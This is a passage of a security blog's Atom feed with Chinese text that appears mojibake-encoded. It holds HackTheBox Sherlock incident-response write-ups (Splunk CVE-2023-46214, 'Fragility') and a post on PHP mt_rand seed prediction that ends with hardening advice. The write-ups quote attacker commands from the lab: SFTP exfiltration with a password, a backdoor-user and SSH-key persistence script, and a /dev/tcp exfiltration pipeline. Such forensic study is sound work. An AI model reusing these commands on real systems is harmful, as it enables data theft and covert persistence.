<p>What MITRE ID corresponds to the technique used by the malicious binary to autonomously gather data?</p>
</blockquote>
<p>æ‰§è¡Œæ¶æ„ä»£ç çš„æ—¶å€™ä¼šè‡ªåŠ¨æ”¶é›†ç”¨æˆ·çš„å„ç§ä¿¡æ¯å’Œæ–‡ä»¶ã€‚æ ¹æ® https://attack.mitre.org/tactics/TA0009/ å¯çŸ¥æ˜¯ T1119.</p>
<h2 id="task-11">Task 11</h2>
<blockquote>
<p>What is the password utilized to exfiltrate the collected files through the file transfer program within the binary?</p>
</blockquote>
<pre><code class="language-bash">@&quot;
open sftp://service:M8&amp;C!i6KkmGL1-#@35.169.66.138/ -hostkey=*
put `&quot;$archivePath`&quot;
close
exit
&quot;@ 
</code></pre>
<p>å®Œç»“æ’’èŠ±<br>
<img src="https://blog-1302016477.cos.ap-guangzhou.myqcloud.com/%E6%88%AA%E5%B1%8F2024-08-13%2014.55.50.png" alt="" loading="lazy"></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[HackTheBox Sherlocks - Fragility]]></title>
        <id>https://xor37.github.io/post/hackthebox-sherlocks-fragility/</id>
        <link href="https://xor37.github.io/post/hackthebox-sherlocks-fragility/">
        </link>
        <updated>2024-08-12T09:27:32.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>åº”æ€¥å“åº”æ—¶æ‰‹å¿™è„šä¹±ï¼Œ WireShark æŠ€å·§éƒ½å¿«å¿˜å…‰äº†ã€‚äºæ˜¯æƒ³é€šè¿‡ HackTheBox Sherlocks çš„é¶æœºå½“ä¾¦æ¢å›é¡¾å’Œæ€»ç»“ä¸€ä¸‹åº”æ€¥å“åº”æŠ€å·§ã€‚HackTheBox Sherlocks æ¨¡æ‹Ÿå„ç§è¢«æ”»å‡»çš„åœºæ™¯ï¼Œè¦æ±‚æ ¹æ®å„ç§æ–‡ä»¶åˆ†ææ”»å‡»è¡Œä¸ºï¼Œå›ç­”é—®é¢˜ã€‚</p>
<p>ç›®å‰åŒ…å«ä¸€ä¸‹å‡ ç§ç±»å‹ï¼š</p>
<ol>
<li>Cloudï¼ˆäº‘å®‰å…¨ï¼‰</li>
<li>SOCï¼ˆå®‰å…¨è¿è¥ä¸­å¿ƒï¼‰</li>
<li>DFIRï¼ˆæ•°å­—å–è¯ä¸äº‹ä»¶å“åº”ï¼‰</li>
<li>Threat Huntingï¼ˆå¨èƒæœå¯»ï¼‰</li>
<li>Threat Intelligenceï¼ˆå¨èƒæƒ…æŠ¥ï¼‰</li>
<li>Malware Analysisï¼ˆæ¶æ„è½¯ä»¶åˆ†æï¼‰</li>
</ol>
<p>æœ¬æ–‡æ˜¯ä¸€å° DFIR é¶æœº<br>
<img src="https://s2.loli.net/2024/08/12/qov6bIVui4NEFRZ.png" alt="Pasted image 20240812171039.png" loading="lazy"></p>
<h2 id="èƒŒæ™¯">èƒŒæ™¯</h2>
<blockquote>
<p>In the monitoring team at our company, each member has access to Splunk web UI using an admin Splunk account. Among them, John has full control over the machine that hosts the entire Splunk system. One day, he panicked and reported to us that an important file on his computer had disappeared. Moreover, he also discovered a new account on the login screen. Suspecting this to be the result of an attack, we proceeded to collect some evidence from his computer and also obtained network capture. Can you help us investigate it?</p>
</blockquote>
<h2 id="task-1">Task 1</h2>
<blockquote>
<p>What CVE did the attacker use to exploit the vulnerability?</p>
</blockquote>
<p>é€šè¿‡èƒŒæ™¯å¯ä»¥çŸ¥é“ Splunk å¾ˆé‡è¦ï¼Œä¹Ÿæåˆ°äº† Splunk web UIï¼Œå¯ä»¥å…ˆçœ‹çœ‹ã€‚<br>
HTTP è¯·æ±‚çš„é‡ä¸å¤§ï¼Œæˆ‘ä»¬å¯ä»¥ç¿»ä¸€ä¸‹ã€‚<br>
<img src="https://s2.loli.net/2024/08/12/2QcrfP3p7sEaGm9.png" alt="Pasted image 20240812172338.png" loading="lazy"><br>
æ‰¾ä¸€ä¸ª HTTP åŒ…è·Ÿè¸ªæ•°æ®æµï¼Œå‘ç°äº†ä¸æ­£å¸¸çš„è¾“å…¥ã€‚<br>
<img src="https://s2.loli.net/2024/08/12/35BSR2OGtJXb1lM.png" alt="æˆªå±2024-08-12 11.25.34.png" loading="lazy"><br>
è§£ç åå°±æ˜¯ï¼š</p>
<pre><code class="language-php">search=|runshellscript+&quot;search.sh&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;&quot;+&quot;1713106812.3&quot;
</code></pre>
<p>Google æœ splunkd search/jogs cveï¼Œå°±èƒ½å‘ç°åˆ©ç”¨çš„æ˜¯ CVE-2023-46214.</p>
<blockquote>
<p>Splunk Enterprise ç‰ˆæœ¬9.0.7 å’Œ 9.1.2ä¹‹å‰ï¼Œç”±äºæœªèƒ½å®‰å…¨æ¸…ç†ç”¨æˆ·æä¾›çš„å¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€è½¬æ¢ (XSLTï¼Œå…¶ä¸­åŒ…å«å°† XMLæ–‡æ¡£è½¬æ¢ä¸ºHTMLã€çº¯æ–‡æœ¬æˆ– PDFç­‰å…¶ä»–æ ¼å¼çš„è§„åˆ™)ï¼Œå¨èƒè€…å¯ä»¥ä¸Šä¼ æ¶æ„ XSLTæ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´åœ¨Splunk Enterpriseå®ä¾‹ä¸Šè¿œç¨‹æ‰§è¡Œä»£ç ã€‚</p>
</blockquote>
<h2 id="task-2">Task 2</h2>
<blockquote>
<p>What MITRE technique does the attacker use to maintain persistence?</p>
</blockquote>
<p>è¦å›ç­”è¿™ä¸ªé—®é¢˜ï¼Œéœ€è¦çŸ¥é“ search.xsl åŒ…å«çš„æ¶æ„å†…å®¹<br>
<img src="https://s2.loli.net/2024/08/12/RUAvgDaLKdBlq3H.png" alt="æˆªå±2024-08-12 11.43.45.png" loading="lazy"><br>
æ•´ç†ä¸€ä¸‹å°±æ˜¯è¿™æ ·ï¼Œå¯ä»¥çœ‹åˆ°é€šè¿‡åŠ ç”¨æˆ·å’Œå†™å…¬é’¥å®ç°æŒä¹…åŒ–ã€‚</p>
<pre><code class="language-bash">#!/bin/bash
adduser --shell /bin/bash --gecos nginx --quiet --disabled-password --home /var/www/ nginx
access=$(echo MzlhNmJiZTY0NTYzLTY3MDktOTNhNC1hOWYzLTJjZTc4Mjhm | base64 -d | rev)
echo quot;nginx:$accessquot; | chpasswd
usermod -aG sudo nginx
mkdir /var/www/.ssh
echo quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDKoougbBG5oQuAQWW2JcHY/ZN49jmeegLqgVlimxv42SfFXcuRgUoyostBB6HnHB5lKxjrBmG/183q1AWn6HBmHpbzjZZqKwSfKgap34COp9b+E9oIgsu12lA1I7TpOw1S6AE71d4iPj5pFFxpUbSG7zJaQ2CAh1qK/0RXioZYbEGYDKVQc7ivd1TBvt0puoogWxllsCUTlJxyQXg2OcDA/8enLh+8UFKIvZy4Ylr4zNY4DyHmwVDL06hcjTfCP4T/JWHf8ShEld15gjuF1hZXOuQY4qwit/oYRN789mq2Ke+Azp0wEo/wTNHeY9OSQOn04zGQH/bLfnjJuq1KQYUUHRCE1CXjUt4cxazQHnNeVWlGOn5Dklb/CwkIcarX4cYQM36rqMusTPPvaGmIbcWiXw9J3ax/QB2DR3dF31znW4g5vHjYYrFeKmcZU1+DCUx075nJEVjy+QDTMQvRXW9Jev6OApHVLZc6Lx8nNm8c6X6s4qBSu8EcLLWYFWIwxqE= support@nginx.orgquot; gt; /var/www/.ssh/authorized_keys
chown -R nginx:nginx /var/www/
cat /dev/null gt; /root/.bash_history
</code></pre>
<p>æ ¹æ® https://attack.mitre.org/tactics/TA0003/ å¯ä»¥çŸ¥é“æ˜¯ T1136</p>
<h2 id="task-3">Task 3</h2>
<blockquote>
<p>John has adjusted the timezone but hasn't rebooted the computer yet, which has led to some things either being updated or not updated with the new timezone. Identifying the timezone can assist you further in your investigation. What was the default timezone and the timezone after John's adjustment on this machine?</p>
</blockquote>
<p>è¿™ä¸ªé€šè¿‡ NTP çš„æ•°æ®åŒ…æ²¡çœ‹å‡ºæ¥ï¼ˆçŸ¥è¯†ç›²åŒºäº†å¯èƒ½æ˜¯ï¼‰é—® AI å„ç§æ—¶åŒºç¼©å†™ï¼Œåœ¨æ—¥å¿—ä¸­å‘ç° PDTï¼ˆUTC-7ï¼‰<br>
<img src="https://s2.loli.net/2024/08/12/AmPIN3wuW4sg5or.png" alt="æˆªå±2024-08-12 16.08.40.png" loading="lazy"></p>
<h2 id="task-4">Task 4</h2>
<blockquote>
<p>When did the attacker SSH in? (UTC)</p>
</blockquote>
<p>å…ˆæ”¹ä¸€ä¸‹æ—¶é—´æ˜¾ç¤ºæ ¼å¼<br>
<img src="https://s2.loli.net/2024/08/12/97jlJpUIxcLdVSb.png" alt="Pasted image 20240812151147.png" loading="lazy"><br>
å®é™…ä¸Šåœ¨ 04-14 15:00:21 æ‰å¼€å§‹ä½¿ç”¨ SSHã€‚<br>
<img src="https://s2.loli.net/2024/08/12/5Y37Kco9lVNSCMf.png" alt="Pasted image 20240812152056.png" loading="lazy"></p>
<h2 id="task-5">Task 5</h2>
<blockquote>
<p>How much time has passed from when the user was first created to when the attacker stopped using SSH?</p>
</blockquote>
<p>æ‰¾åˆ°åˆ›å»ºç”¨æˆ·çš„æ•°æ®åŒ…å’Œæœ€åä¸€ä¸ª SSH æ•°æ®åŒ…ï¼Œå‡ä¸€ä¸‹å³å¯ã€‚<br>
<img src="https://s2.loli.net/2024/08/12/3rvL4js9zwWQxKU.png" alt="Pasted image 20240812153025.png" loading="lazy"></p>
<h2 id="task-6">Task 6</h2>
<blockquote>
<p>What is the password for the account that the attacker used to backdoor?</p>
</blockquote>
<p>æ ¹æ®ä¹‹å‰æš´éœ²çš„æ”»å‡»è„šæœ¬å¾—çŸ¥<br>
<img src="https://s2.loli.net/2024/08/12/RI8OQfS1Kcxai6q.png" alt="æˆªå±2024-08-12 15.39.06.png" loading="lazy"></p>
<h2 id="task-7">Task 7</h2>
<blockquote>
<p>There is a secret in the exfiltrated file, what is its content?</p>
</blockquote>
<p>è¿™ä¸ªé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œå…ˆæœé›†ä¿¡æ¯ã€‚ä»å‰é¢çš„åˆ†ææˆ‘ä»¬çŸ¥é“æ”»å‡»è€…é€šè¿‡æ·»åŠ ç”¨æˆ·è¿›æ¥ï¼Œå¯ä»¥å»å®¶ç›®å½•çœ‹çœ‹å…ˆã€‚<br>
<img src="https://s2.loli.net/2024/08/12/dcPyzOsNUYpal5v.png" alt="æˆªå±2024-08-12 16.22.48.png" loading="lazy"><br>
ä» bash_history ä¸­å‘ç°äº†æ”»å‡»è€…åŠ å¯†äº† Important.pdfï¼Œå¹¶é€šè¿‡ 8080 ç«¯å£å‘ç»™è‡ªå·±äº†ã€‚</p>
<pre><code class="language-bash">sudo openssl enc -aes-256-cbc -iv $(cut -c 1-32 &lt;&lt;&lt; $(uname -r | md5sum)) -K $(cut -c 1-64 &lt;&lt;&lt; $(date +%s | sha256sum)) -in data.zip | base64 | dd conv=ebcdic &gt; /dev/tcp/192.168.222.130/8080
</code></pre>
<p>å¯æƒœå¯†é’¥è¢«éšè—äº†ï¼Œæˆ‘çš„æ€è·¯æ˜¯é€šè¿‡æ—¥å¿—ï¼Œå¯èƒ½å¯ä»¥æ‰¾åˆ°å®Œæ•´çš„å‘½ä»¤ã€‚<br>
<img src="https://s2.loli.net/2024/08/12/EvrGAMP6iFNYWOq.png" alt="æˆªå±2024-08-12 16.26.19.png" loading="lazy"><br>
åœ¨æ•°æ®åŒ…é‡Œæ‰¾åˆ° data.zipã€‚</p>
<pre><code class="language-bash">ip.src==192.168.222.130 &amp;&amp; ip.dst==192.168.222.145&amp;&amp;tcp.port==8080
</code></pre>
<p>è¿‡æ»¤è§„åˆ™å®šä½åˆ°æ•°æ®åŒ…ï¼Œè·Ÿè¸ªæµåå¯¼å‡ºã€‚<br>
<img src="https://s2.loli.net/2024/08/12/DZJixvLft1S8qYp.png" alt="Pasted image 20240812165313.png" loading="lazy"><br>
åè¿‡æ¥è§£å¯†å³å¯</p>
<pre><code class="language-bash">dd if=enc_data.zip conv=ascii bs=1 | base64 -d | openssl enc -aes-256-cbc -d -iv 4fa17640b7dfe8799f072c65b15f581d -K 3cabc6db78a034f69f16aa8986cf2e2cea05713b1e95ff9b2d80f6a71ae76b7d -out data.zip
</code></pre>
<h2 id="task-8">Task 8</h2>
<blockquote>
<p>What are the username and password that the attacker uses to access Splunk?</p>
</blockquote>
<p>æ‰¾ä¸€ä¸‹ Splunk ç™»é™†åŒ…å³å¯ã€‚</p>
<pre><code class="language-bash">POST /en-US/account/login HTTP/1.1
Host: ubuntu:8000
User-Agent: python-requests/2.31.0
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: keep-alive
Cookie: cval=1073532663; splunkweb_uid=AFB697A8-D703-4347-B58C-F751D8BD2E0F
Content-Length: 78
Content-Type: application/x-www-form-urlencoded

cval=1073532663&amp;username=johnnyC&amp;password=h3Re15j0hnNy&amp;set_has_logged_in=false
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[mt_rand ä¼ªéšæœºæ•°æ”»å‡»æ€»ç»“]]></title>
        <id>https://xor37.github.io/post/mt_rand-php-wei-sui-ji-shu-gong-ji-zong-jie/</id>
        <link href="https://xor37.github.io/post/mt_rand-php-wei-sui-ji-shu-gong-ji-zong-jie/">
        </link>
        <updated>2024-08-01T09:30:21.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>æœ€è¿‘åŒäº‹å‘ç°éªŒè¯ç æ¥å£åœ¨çŸ­æ—¶é—´å†…å‡ºç°ä¸¤ä¸ªç›¸åŒçš„éªŒè¯ç çš„ç¥å¥‡æƒ…å†µã€‚<br>
ä»ä»£ç ä¸­å¾—çŸ¥éªŒè¯ç æ˜¯é€šè¿‡ mt_rand() ç”Ÿæˆçš„éšæœºæ•°ï¼Œé‚å¼€å§‹äº†è§£ mt_rand() çš„å®‰å…¨æ€§ã€‚</p>
<h2 id="ä¼ªéšæœºæ•°æ¼æ´">ä¼ªéšæœºæ•°æ¼æ´</h2>
<ul>
<li><code>mt_scrand()</code> â€ƒ æ’­ç§ Mersenne Twister éšæœºæ•°ç”Ÿæˆå™¨ç§å­ã€‚</li>
<li><code>mt_rand()</code> â€ƒ â€ƒ ç”Ÿæˆéšæœºæ•°ã€‚</li>
</ul>
<p>mt_rand() æ¯æ¬¡è¢«è°ƒç”¨éƒ½ä¼šæ ¹æ®ç§å­ seed å’Œå½“å‰è°ƒç”¨çš„æ¬¡æ•° i æ¥è®¡ç®—å‡ºä¸€ä¸ªä¼ªéšæœºæ•°ã€‚<br>
å½“ç§å­ç›¸åŒæ—¶ï¼Œå®é™…ä¸Šç”Ÿæˆçš„ä¼ªéšæœºæ•°æ˜¯ä¸å˜çš„ï¼Œè¿™å°±æ˜¯ä¼ªéšæœºæ•°çš„æ¼æ´æ‰€åœ¨ã€‚</p>
<h2 id="ç§å­ä»å“ªæ¥">ç§å­ä»å“ªæ¥ï¼Ÿ</h2>
<h3 id="php-7x-80-81">PHP 7.x 8.0-8.1</h3>
<p>PHP åœ¨ç¬¬ä¸€æ¬¡ä½¿ç”¨éšæœºæ•°æ—¶è¿›è¡Œ seedingï¼Œseeding çš„ç†µä»…æœ‰å•ä¸€æ¥æºï¼šç³»ç»Ÿå½“å‰çš„æ—¶é—´ï¼Œå•ä½å¾®ç§’ã€‚<br>
åœ°å€ï¼šhttps://github.com/php/php-src/blob/PHP-7.4.25/ext/standard/mt_rand.c</p>
<pre><code class="language-c">PHPAPI void php_mt_srand(uint32_t seed)
{
  php_mt_initialize(seed, BG(state));
  php_mt_reload();
  BG(mt_rand_is_seeded) = 1;
}


PHPAPI uint32_t php_mt_rand(void)
{
  uint32_t s1;
  if (UNEXPECTED(!BG(mt_rand_is_seeded))) {
  	zend_long bytes;
	if (php_random_bytes_silent(&amp;bytes, sizeof(zend_long)) == FAILURE) {
		bytes = GENERATE_SEED();
	}
	php_mt_srand(bytes);
}
  if (BG(left) == 0) {
  	php_mt_reload();
  }
  --BG(left);
  s1 = *BG(next)++;
  s1 ^= (s1 &gt;&gt; 11);
  s1 ^= (s1 &lt;&lt;  7) &amp; 0x9d2c5680U;
  s1 ^= (s1 &lt;&lt; 15) &amp; 0xefc60000U;
  return ( s1 ^ (s1 &gt;&gt; 18) );
}

</code></pre>
<h3 id="php-82-83">PHP 8.2-8.3</h3>
<p>é¦–å…ˆå°è¯•é€šè¿‡ php_random_bytes_silent è¿›è¡Œ seedingï¼Œè‹¥å¤±è´¥å›é€€åˆ°æ—¶é—´ï¼Œä½†ä¸å¤ªå¯èƒ½å¤±è´¥ã€‚</p>
<h3 id="php-84æœªå‘å¸ƒ">PHP 8.4+ï¼ˆæœªå‘å¸ƒï¼‰</h3>
<p>é¦–å…ˆå°è¯•é€šè¿‡ php_random_bytes_silent è¿›è¡Œ seedingï¼Œè‹¥å¤±è´¥å›é€€åˆ° php_random_generate_fallback_seedã€‚<br>
php_random_generate_fallback_seed çš„ç†µéå¸¸é«˜ï¼ŒåŒ…å«äº†æ—¶é—´ï¼Œpidï¼ŒASLRåœ°å€ç­‰ï¼Œå‡ ä¹ä¸å¯é¢„æµ‹ã€‚</p>
<h2 id="æ”»å‡»æ–¹å¼">æ”»å‡»æ–¹å¼</h2>
<h3 id="è®¡ç®—ç§å­">è®¡ç®—ç§å­</h3>
<p>åœ°å€ï¼šhttps://www.ambionics.io/blog/php-mt-rand-prediction<br>
ç»™å®šé—´éš” 226 ä¸ªå€¼çš„ä¸¤ä¸ª mt_rand() è¾“å‡ºç»“æœï¼Œä¾‹å¦‚ç¬¬ 1 å’Œ 228 ä¸ª mt_rand() çš„è¾“å‡ºç»“æœã€‚<br>
è¿™é‡Œçš„æ —å­æ˜¯ï¼šç§å­ä¸º 12345678ï¼Œè·å–ç¬¬ 124 ä¸ªéšæœºå€¼å’Œç¬¬ 350 ï¼ˆ124+226ï¼‰ä¸ªéšæœºå€¼ã€‚<br>
<img src="https://s2.loli.net/2024/08/04/MWxeqfcGzvVtaCy.png" alt="" loading="lazy"><br>
é€šè¿‡å¤§ä½¬çš„è„šæœ¬å³å¯è¿˜åŸç§å­ã€‚<br>
<img src="https://s2.loli.net/2024/08/04/8DywCIUkXV7fGbS.png" alt="" loading="lazy"></p>
<h3 id="çˆ†ç ´ç§å­">çˆ†ç ´ç§å­</h3>
<p>åœ°å€ï¼šhttps://github.com/openwall/php_mt_seed<br>
åªéœ€è¦çŸ¥é“ç¬¬ä¸€ä¸ªéšæœºæ•°å³å¯çˆ†ç ´å‡ºç§å­ï¼Œæœ‰æ›´å¤šè¿ç»­çš„éšæœºæ•°çš„è¯ç»“æœä¼šæ¯”è¾ƒå‡†ç¡®ã€‚ï¼ˆè¿™é‡Œç”¨ä¸¤ä¸ªéšæœºæ•°å°±çˆ†å‡ºæ¥äº†ï¼‰<br>
<img src="https://s2.loli.net/2024/08/04/apN4IOX2fVrzHLv.png" alt="" loading="lazy"></p>
<h3 id="çˆ†ç ´ç§å­-é‡Œåº”å¤–åˆ">çˆ†ç ´ç§å­ - é‡Œåº”å¤–åˆ</h3>
<p>åœ°å€ï¼šhttps://github.com/moorejacob2017/exploiting_phps_rand_function<br>
Jacob Moore çš„ç ”ç©¶ï¼Œåªéœ€è¦çŸ¥é“ pid ä¸ç”Ÿæˆç§å­æ—¶ç³»ç»Ÿçš„æ—¶é—´ï¼Œå³å¯çˆ†å‡ºç§å­ã€‚æ¯”è¾ƒé€‚åˆåšåé—¨ï¼Ÿ</p>
<h4 id="ç§å­çš„æ„æˆ">ç§å­çš„æ„æˆ</h4>
<p>https://github.com/php/php-src/blob/PHP-8.1/ext/standard/php_rand.h<br>
<img src="https://s2.loli.net/2024/08/04/B7v5w26PSfUXVgR.png" alt="" loading="lazy"><br>
run_exploit.sh ä¼šè‡ªåŠ¨è·å–å½“å‰è¿›ç¨‹çš„ pid å’Œç³»ç»Ÿæ—¶é—´ï¼Œå³å¯çˆ†ç ´å‡ºç§å­ã€‚<br>
<img src="https://s2.loli.net/2024/08/04/K5ChELdyMIQrTge.png" alt="" loading="lazy"></p>
<h3 id="é‡å¤éšæœºæ•°é£é™©">é‡å¤éšæœºæ•°é£é™©</h3>
<p>åœ¨å¤šè¿›ç¨‹çš„åœºæ™¯ä¸‹ï¼Œä¸¤ä¸ªä¸åŒçš„è¯·æ±‚è¿›å…¥åŒä¸€ä¸ª pod çš„ä¸¤ä¸ªä¸åŒçš„å­è¿›ç¨‹ï¼Œå¾ˆæœ‰å¯èƒ½ç”Ÿæˆä¸¤ä¸ªç›¸åŒçš„ç§å­ï¼Œå¯¼è‡´åé¢çš„éšæœºæ•°å®Œå…¨ä¸€è‡´ã€‚ä¾‹å¦‚ä½¿ç”¨ mt_rand ç”ŸæˆéªŒè¯ç çš„åœºæ™¯ï¼Œä½ å¯èƒ½å¤šæ¬¡æ”¶åˆ°ç›¸åŒéªŒè¯ç ã€‚</p>
<h2 id="åŠ å›ºå»ºè®®">åŠ å›ºå»ºè®®</h2>
<p>ä½¿ç”¨ PHP ä¸­çš„ random_int() æˆ– openssl_random_pseudo_bytes() ï¼Œè¿™äº›å‡½æ•°æ˜¯å¯†ç å­¦å®‰å…¨éšæœºæ•°ï¼ˆCSPRNGï¼‰ï¼Œæ®æœ‰è‰¯å¥½çš„ä¸å¯é¢„æµ‹æ€§ã€‚</p>
]]></content>
    </entry>
</feed>